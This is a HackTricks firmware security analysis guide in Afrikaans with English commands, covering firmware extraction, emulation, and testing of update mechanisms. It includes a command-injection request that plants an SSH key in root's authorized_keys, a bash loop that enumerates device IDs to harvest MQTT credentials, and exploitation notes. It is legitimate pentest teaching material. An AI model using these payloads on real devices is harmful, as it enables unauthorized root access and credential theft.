# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Inleiding**

### Verwante hulpbronne


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te funksioneer deur die kommunikasie tussen die hardeware-komponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, wat verseker dat die toestel toegang het tot vitale instruksies vanaf die oomblik dat dit aangeskakel word, wat lei tot die opstart van die bedryfstelsel. Die ontleding en moontlike wysiging van firmware is 'n kritieke stap om sekuriteitskwesbaarhede te identifiseer.

## **Inligtinginsameling**

**Inligtinginsameling** is 'n kritieke aanvanklike stap om 'n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die versameling van data oor:

- Die CPU-argitektuur en die bedryfstelsel waarop dit loop
- Bootloader-spesifieke besonderhede
- Hardeware-uitleg en datasheets
- Codebase-metrieke en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenisse en regulatoriese sertifiseringe
- Argitektoniese en stroomdiagramme
- Sekuriteitsassesserings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)** tools van onskatbare waarde, net soos die ontleding van beskikbare open-source sagtewarekomponente deur handmatige en geoutomatiseerde hersieningsprosesse. Tools soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese analise wat benut kan word om potensiële probleme te vind.

## **Verkryging van die Firmware**

Firmware kan op verskeie maniere verkry word, elk met sy eie vlak van kompleksiteit:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- **Bou** dit vanaf voorsien instruksies
- **Laai af** vanaf amptelike ondersteuningswebwerwe
- Gebruik **Google dork**-navrae om gehoste firmware-lêers te vind
- Toegang tot **cloud storage** direk, met hulpmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Aftap van **updates** via man-in-the-middle-tegnieke
- **Ekstraheer** vanaf die toestel via verbindings soos **UART**, **JTAG**, of **PICit**
- **Sniffing** na update-versoeke binne toestelkommunikasie
- Identifiseer en gebruik **hardcoded update endpoints**
- **Dumping** vanaf die bootloader of netwerk
- **Verwyder en lees** die stoorchip, wanneer alles anders faal, met geskikte hardeware-instrumente

### UART-only logs: force a root shell via U-Boot env in flash

As UART RX geïgnoreer word (slegs logs), kan jy steeds 'n init shell afdwing deur die **U-Boot environment blob** offline te wysig:

1. Dump SPI flash met 'n SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Vind die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **herbereken die U-Boot env CRC32** vir die blob.
3. Herflash slegs die env-partisie en herbegin; 'n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die bootloader-shell gedeaktiveer is, maar die env-partisie skryfbaar is via eksterne flash-toegang.

## Ontleding van die firmware

Nou dat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Verskeie gereedskap wat jy hiervoor kan gebruik:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Indien jy nie veel met daardie gereedskap vind nie, kontroleer die **entropy** van die image met `binwalk -E <bin>`; as die entropy laag is, is dit nie waarskynlik geënkripteer nie. As die entropy hoog is, is dit waarskynlik geënkripteer (of op een of ander manier gekomprimeer).

Verder kan jy hierdie gereedskap gebruik om **lêers ingebed in die firmware** ekstraheer:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Verkry die Filesystem

Met die voorafgenoemde gereedskap soos `binwalk -ev <bin>` moes jy die **filesystem kon ekstraheer**.\
Binwalk ekstraheer dit gewoonlik binne 'n **gids met die naam van die filesystem-tipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuele Filesystem-ekstraksie

Soms sal binwalk **nie die magic byte van die filesystem in sy signatures hê nie**. In sulke gevalle, gebruik binwalk om die **offset van die filesystem te vind en die gekomprimeerde filesystem te carve** uit die binêre en die filesystem **manueel te ekstraheer** volgens die tipe met die stappe hieronder.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Voer die volgende **dd command** uit, carving die Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die `squashfs-root`-gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware-analise

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede te verstaan. Hierdie proses behels die gebruik van verskeie gereedskap om waardevolle data uit die firmware-image te ontleed en te onttrek.

### Aanvanklike analise-gereedskap

Daar word 'n stel opdragte verskaf vir die aanvanklike inspeksie van die binêre lêer (verwys as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, strings te onttrek, binêre data te ontleed en die partisie- en lêerstelselbesonderhede te verstaan:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Om die enkripsiestatus van die image te bepaal, word die **entropie** gecheck met `binwalk -E <bin>`. Lae entropie dui op 'n gebrek aan enkripsie, terwyl hoë entropie moontlike enkripsie of kompressie aandui.

Om **ingeslote lêers** te onttrek, word hulpmiddels en hulpbronne soos die **file-data-carving-recovery-tools** dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Uittrekking van die lêerstelsel

Deur `binwalk -ev <bin>` te gebruik, kan mens gewoonlik die lêerstelsel uithaal, dikwels in 'n gids wat na die lêerstelseltipe vernoem is (bv., squashfs, ubifs). Wanneer **binwalk** egter misluk om die lêerstelseltipe te herken as gevolg van ontbrekende magic bytes, is handmatige uithaling nodig. Dit behels die gebruik van `binwalk` om die offset van die lêerstelsel te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te kerf:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daarna, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs), word verskillende opdragte gebruik om die inhoud handmatig uit te trek.

### Lêerstelsel-analise

Sodra die lêerstelsel uitgepak is, begin die soektog na sekuriteitsfoute. Aandag word gegee aan insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, en compiled binaries vir offline-analise.

**Belangrike lokasies** en **items** om te inspekteer sluit in:

- **etc/shadow** en **etc/passwd** vir user credentials
- SSL-sertifikate en sleutels in **etc/ssl**
- Konfigurasie- en skriplêers vir potensiële kwesbaarhede
- Ingebedde binaries vir verdere analise
- Algemene IoT device webservers en binaries

Verskeie tools help om sensitiewe inligting en kwesbaarhede binne die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### Sekuriteitskontroles op gecompileerde binaries

Beide source code en gecompileerde binaries wat in die lêerstelsel gevind word, moet noukeurig ondersoek word vir kwesbaarhede. Tools soos **checksec.sh** vir Unix binaries en **PESecurity** vir Windows binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Ondertrekking van cloud config en MQTT credentials via afgeleide URL-tokens

Baie IoT-hubs haal hul per-device konfigurasie van 'n cloud endpoint wat soos volg lyk:

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-analise mag jy vind dat `<token>` lokaal afgelei word vanaf die device ID deur gebruik van 'n hardcoded secret, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp maak dit moontlik vir enigiemand wat 'n deviceId en die STATIC_KEY ken om die URL te herbou en cloud config af te haal, wat dikwels plaintext MQTT credentials en topic prefixes openbaar.

Praktiese werkvloeistappe:

1) Extract deviceId from UART boot logs

- Sluit 'n 3.3V UART adapter (TX/RX/GND) aan en vang logs op:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Soek vir lyne wat die cloud config URL pattern en broker address druk, byvoorbeeld:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Herkry STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config-pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv., MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en verander die digest na hoofletters:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Versamel cloud config en MQTT credentials

- Stel die URL saam en haal JSON met curl; parse met jq om secrets te onttrek:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herstelde credentials om na maintenance topics te subscribe en te soek na sensitiewe events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumereer voorspelbare device IDs (op skaal, met outorisering)

- Baie ekosisteme embed vendor OUI/product/type bytes wat gevolg word deur 'n sekwensiële agtervoegsel.
- Jy kan kandidaat-IDs deurloop, tokens aflei en configs programmaties ophaal:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Aantekeninge
- Verkry altyd uitdruklike magtiging voordat jy massale enumerasie probeer.
- Gebruik liewer emulation of static analysis om secrets te herstel sonder om doel-hardware te wysig waar moontlik.

Die proses om firmware te emuleer maak **dynamic analysis** moontlik, hetsy van die werking van 'n toestel of van 'n individuele program. Hierdie benadering kan probleme ondervind met hardware- of architecture-afhanklikhede, maar die oordrag van die root filesystem of spesifieke binaries na 'n toestel met ooreenstemmende architecture en endianness, soos 'n Raspberry Pi, of na 'n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Emuleer individuele binaries

Om enkelfunksieprogramme te ondersoek, is dit van kardinale belang om die program se endianness en CPU architecture te identifiseer.

#### Voorbeeld met MIPS Architecture

Om 'n MIPS Architecture binary te emuleer, kan jy die volgende opdrag gebruik:
```bash
file ./squashfs-root/bin/busybox
```
En om die nodige emulasie-gereedskap te installeer:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian binaries sal `qemu-mipsel` die keuse wees.

#### ARM-argitektuur-emulasie

Vir ARM binaries is die proses soortgelyk, met die `qemu-arm` emulator wat vir emulasie gebruik word.

### Volledige stelsel-emulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), en ander fasiliteer volledige firmware-emulasie, outomatiseer die proses en help met dinamiese analise.

## Dinamiese analise in praktyk

Op hierdie stadium word óf 'n werklike óf 'n geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die OS en filesystem te behou. Emulasie mag nie hardeware-interaksies perfek naboots nie, wat af en toe 'n herbegin van die emulasie vereis. Analise moet die filesystem weer besoek, blootgestelde webbladsye en netwerkdienste uitbuit, en bootloader-kwesbaarhede ondersoek. Firmware-integriteitstoetse is kritiek om potensiële backdoor-kwesbaarhede te identifiseer.

## Runtime-analise tegnieke

Runtime-analise behels die interaksie met 'n proses of binary in sy operasionele omgewing, met behulp van gereedskap soos gdb-multiarch, Frida, en Ghidra om breakpoints te stel en kwesbaarhede deur middel van fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder 'n volledige debugger, **kopieer 'n staties-gekoppelde `gdbserver`** na die toestel en koppel op afstand aan:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binaire uitbuiting en Proof-of-Concept

Die ontwikkeling van 'n PoC vir geïdentifiseerde kwesbaarhede vereis 'n diepgaande begrip van die teiken-argitektuur en programmering in laervlak tale. Binaire runtime-beskermings in ingebedde stelsels is skaars, maar wanneer dit wel voorkom, mag tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc fastbin notas oor uitbuiting (embedded Linux)

- **Fastbins + consolidation:** uClibc gebruik fastbins soortgelyk aan glibc. 'n Later groot toewysing kan `__malloc_consolidate()` aktiveer, so enige vals chunk moet kontroles deurstaan (sinvolle grootte, `fd = 0`, en omliggende chunks beskou as "in use").
- **Non-PIE binaries under ASLR:** as ASLR aangeskakel is maar die hoof-binary is **non-PIE**, in-binary `.data/.bss` adresse is stabiel. Jy kan 'n streek teiken wat reeds soos 'n geldige heap chunk header lyk om 'n fastbin-toewysing op 'n **function pointer table** te land.
- **Parser-stopping NUL:** wanneer JSON gepars word, kan 'n `\x00` in die payload parsing stop terwyl agterblywende, aanvaller-beheerde bytes behou word vir 'n stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** 'n ROP chain wat `open("/proc/self/mem")`, `lseek()`, en `write()` aanroep kan uitvoerbare shellcode in 'n bekende mapping plant en daarna na dit spring.

## Vooraf-gekonfigureerde bedryfstelsels vir firmware-analise

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf-gekonfigureerde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige gereedskap.

## Vooraf-gekonfigureerde OSs om Firmware te ontleed

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is 'n distro bedoel om jou te help met security assessment en penetration testing van Internet of Things (IoT)-toestelle. Dit bespaar jou baie tyd deur 'n vooraf-gekonfigureerde omgewing met al die nodige gereedskap te lewer.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded sekuriteitstoetsbedryfstelsel gebaseer op Ubuntu 18.04, vooraf gelaai met firmware-sekuriteitstoetsgereedskap.

## Firmware-afgradering-aanvalle & Onveilige opdateringsmeganismes

Selfs wanneer 'n verskaffer kriptografiese handtekeningkontroles vir firmware-images implementeer, word version rollback (downgrade) beskerming dikwels weggelaat. Wanneer die boot- of recovery-loader slegs die handtekening verifieer met 'n ingebedde publieke sleutel, maar nie die *weergawe* (of 'n monotone teller) van die image wat geflits word vergelyk nie, kan 'n aanvaller wettiglik 'n ouer, kwesbare firmware installeer wat steeds 'n geldige handtekening dra en sodoende gepatchte kwesbaarhede herintroduseer.

Tipiese aanval-werkvloei:

1. **Obtain an older signed image**
   * Haal dit vanaf die verskaffer se publieke aflaaipoortaal, CDN of ondersteuningswerf.
   * Ekstraheer dit uit geselskap mobiele/lessenaar-toepassings (bv. binne 'n Android APK onder `assets/firmware/`).
   * Verkry dit vanaf derdeparty-repositories soos VirusTotal, internet-argiewe, forums, ens.
2. **Upload or serve the image to the device** via any exposed update channel:
   * Web UI, mobile-app API, USB, TFTP, MQTT, ens.
   * Baie verbruikers-IoT-toestelle openbaar *unauthenticated* HTTP(S)-endpunte wat Base64-geënkodeerde firmware-blobs aanvaar, dit server-side dekodeer en recovery/upgrade aktiveer.
3. Na die downgrade, benut 'n kwesbaarheid wat in die nuwer vrystelling gepatch is (bv. 'n command-injection filter wat later bygevoeg is).
4. Opsioneel flits die nuutste image weer terug of skakel opdaterings af om opsporing te vermy sodra persistentie verkry is.

### Voorbeeld: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In die kwesbare (gedowngrade) firmware word die `md5`-parameter direk in 'n shell-opdrag gekonkateneer sonder sanitisering, wat die inspuiting van arbitraire opdragte toelaat (hier — die aktivering van SSH-sleutelgebaseerde root-toegang). Later firmware-weergawes het 'n basiese karakterfilter ingestel, maar die gebrek aan downgrade-beskerming maak die regstelling sinledig.

### Uittrek van firmware uit mobiele apps

Baie verskaffers bundel volledige firmware-beeldlêers binne hul maat-mobiele toepassings sodat die app die toestel oor Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik onversleuteld in die APK/APEX gestoor onder paaie soos `assets/fw/` of `res/raw/`. Gereedskap soos `apktool`, `ghidra`, of selfs eenvoudige `unzip` laat jou toe om ondertekende firmware-beeldlêers te onttrek sonder om die fisiese hardeware aan te raak.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolelys vir die evaluering van update-logika

* Is die oordrag/verifikasie van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die toestel **weergawe-nommers** of 'n **monotonic anti-rollback counter** voordat dit geflas word?
* Word die image binne 'n secure boot chain geverifieer (bv. handtekeninge deur ROM-kode nagegaan)?
* Voer userland-kode bykomende sanity checks uit (bv. toegelate partisiekaart, modelnommer)?
* Word *partial* of *backup* update-vloei dieselfde validasielogika hergebruik?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwetsbare firmware om op te oefen

Om te oefen om kwesbaarhede in firmware te ontdek, gebruik die volgende kwetsbare firmware-projekte as 'n beginpunt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Verwysings

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
